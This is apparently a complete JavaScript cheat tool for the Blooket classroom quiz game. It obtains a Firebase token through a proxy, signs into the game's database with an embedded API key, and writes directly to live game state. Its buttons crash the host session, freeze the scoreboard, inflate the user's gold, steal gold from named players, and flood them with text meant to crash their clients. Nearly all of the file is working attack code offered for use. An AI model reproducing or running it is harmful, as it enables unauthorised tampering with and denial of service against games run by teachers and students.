// ============================================================
// BLOOKET CHEAT ENGINE — Full Godmode
// ============================================================

// ─── CONFIG ───
const PROXY_URL = 'https://YOUR_WORKER_URL_HERE'; // <-- CHANGE THIS

let activeGame = null;
let db = null;

// ─── UI Helpers ───
function updateStatus(msg) {
    const el = document.getElementById('status');
    if (el) el.innerHTML = 'Status: ' + msg;
    console.log('[Status]', msg);
}

// ─── Checkbox Handler ───
document.querySelectorAll('checkbox').forEach(cb => {
    cb.addEventListener('click', function() {
        if (this.getAttribute('checked')) this.removeAttribute('checked');
        else this.setAttribute('checked', 'true');
    });
});

// ─── Join Button ───
document.getElementById('joinBtn').onclick = async () => {
    const pin = document.getElementById('gamePin').value.trim();
    const name = document.getElementById('playerName').value.trim();

    if (!pin || !name) {
        updateStatus('❌ Enter both Game PIN and Nickname!');
        return;
    }

    updateStatus('🔑 Connecting to proxy...');

    try {
        // 1. Get token from your Worker
        const response = await fetch(`${PROXY_URL}/join`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ pin, name })
        });

        const data = await response.json();

        if (!data.success) {
            throw new Error(data.error || 'Proxy returned error');
        }

        if (!data.fbToken || !data.fbShardURL) {
            throw new Error('Missing token from proxy');
        }

        updateStatus('🔥 Initializing Firebase...');

        // 2. Initialize Firebase with Blooket's config
        const app = firebase.initializeApp({
            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
            authDomain: "blooket-2020.firebaseapp.com",
            databaseURL: data.fbShardURL
        });

        // 3. Sign in with the custom token
        await firebase.auth().signInWithCustomToken(data.fbToken);
        db = firebase.database();
        activeGame = { pin, name };

        updateStatus('✅ CONNECTED! Cheats active.');
        document.getElementById('cheatPanel').style.display = 'block';

        // 4. Load player list for steal dropdown
        loadPlayerList();

    } catch (error) {
        updateStatus('❌ Error: ' + error.message);
        console.error(error);
        // Fallback to demo mode so user can still see the UI
        demoMode();
    }
};

// ─── Firebase Write Helper ───
function setUserVal(path, value) {
    if (!activeGame || !db) {
        alert('Not connected to a game!');
        return;
    }
    const fullPath = `/${activeGame.pin}/c/${activeGame.name}/${path}`;
    db.ref(fullPath).set(value);
    console.log(`✅ Wrote to ${fullPath}:`, value);
}

// ─── Load Players for Steal Dropdown ───
async function loadPlayerList() {
    if (!db || !activeGame) return;
    try {
        const snapshot = await db.ref(`/${activeGame.pin}/c`).once('value');
        const players = snapshot.val();
        const select = document.getElementById('targetPlayer');
        select.innerHTML = '';
        for (let name in players) {
            if (name !== activeGame.name) {
                const opt = document.createElement('option');
                opt.value = name;
                opt.textContent = name + ' (💰' + (players[name]?.g || 0) + ')';
                select.appendChild(opt);
            }
        }
    } catch (e) {
        console.warn('Could not load player list:', e);
    }
}

// ─── Cheat Buttons ───

// CRASH HOST
document.getElementById('crashHostBtn').onclick = () => {
    setUserVal('g/t', 't');
    updateStatus('💥 Crash command sent! Host should freeze.');
};

// FREEZE SCOREBOARD
document.getElementById('freezeScoreboardBtn').onclick = () => {
    setUserVal('tat/t', 't');
    updateStatus('❄️ Freeze command sent! Scoreboard should lock.');
};

// SET GOLD
document.getElementById('setGoldBtn').onclick = () => {
    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
    setUserVal('g', amount);
    updateStatus(`💰 Gold set to ${amount}!`);
};

// STEAL GOLD
document.getElementById('stealGoldBtn').onclick = () => {
    const target = document.getElementById('targetPlayer').value;
    const amount = document.getElementById('stealAmount').value;
    if (!target || !amount) {
        alert('Select a target and enter an amount!');
        return;
    }
    setUserVal('tat', `${target}:${amount}`);
    updateStatus(`💰 Stole ${amount} gold from ${target}!`);
};

// CHANGE BLOOK
document.getElementById('setBlookBtn').onclick = () => {
    const blook = document.getElementById('blookSelect').value;
    setUserVal('b', blook);
    updateStatus(`🎭 Blook changed to ${blook}!`);
};

// LEAVE GAME
document.getElementById('leaveGameBtn').onclick = () => {
    if (db && activeGame) {
        db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
    }
    updateStatus('🚪 Left game');
    document.getElementById('cheatPanel').style.display = 'none';
    activeGame = null;
    db = null;
};

// FLOOD ALERT
document.getElementById('floodAlertBtn').onclick = () => {
    const floodText = 'HACKED '.repeat(1000);
    setUserVal('tat', `${activeGame?.name || 'You'}:${Date.now()}${floodText}`);
    updateStatus('📢 Flood sent! Target may crash.');
};

// ─── Demo Mode (Fallback if proxy fails) ───
function demoMode() {
    updateStatus('⚠️ DEMO MODE: Proxy not connected. Showing explanations.');
    document.getElementById('cheatPanel').style.display = 'block';
    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 
                  'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'];
    btns.forEach(id => {
        const btn = document.getElementById(id);
        if (btn && !btn._demoHooked) {
            btn._demoHooked = true;
            btn.onclick = () => {
                alert('⚠️ Backend proxy not configured.\nSet PROXY_URL in cheat.js');
            };
        }
    });
}

// ─── Initial Status ───
updateStatus('Ready (set PROXY_URL in cheat.js)');
